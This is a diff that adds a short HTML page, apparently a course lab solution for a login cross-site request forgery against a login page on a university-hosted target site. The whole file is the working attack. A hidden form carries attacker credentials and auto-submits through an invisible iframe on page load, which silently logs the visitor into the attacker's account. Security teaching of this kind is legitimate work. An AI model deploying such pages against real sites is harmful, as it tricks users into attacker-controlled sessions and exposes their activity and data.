@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <iframe name="stealth_frame" style="display:none;"></iframe>
+
+    <form id="csrf_form" action="https://bungle.sysnet.ucsd.edu/login" method="POST" target="stealth_frame">
+      <input type="hidden" name="username" value="attacker">
+      <input type="hidden" name="password" value="l33th4x">
+    </form>
+
+    <script>
+      window.onload = function() {
+        document.getElementById('csrf_form').submit();
+      };
+    </script>
+  </body>
+</html>
